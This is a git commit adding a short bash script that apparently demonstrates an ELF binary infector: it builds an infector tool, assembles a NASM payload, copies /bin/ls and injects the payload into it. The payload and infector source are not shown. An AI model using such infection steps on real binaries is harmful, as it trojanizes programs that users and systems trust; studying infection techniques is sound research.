ded2ff1bef4e7c4e7c6300415b9f4c54c3c273fa
Arattel <sizonov2000@gmail.com>
2019-12-23 18:01:49 +0200

    Added demonstration bash script

---
+++ demonstration.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+
+# Compiling executables 
+cmake -G\"Unix Makefiles\"
+make
+
+# Compiling assembly payload
+nasm -f elf64 -o payload.o payload.asm
+ld -o payload payload.o
+
+# Copying ls to current directory
+
+cp /bin/ls .
+
+# Infecting ls using our payload
+
+./infector -p ls payload out_file
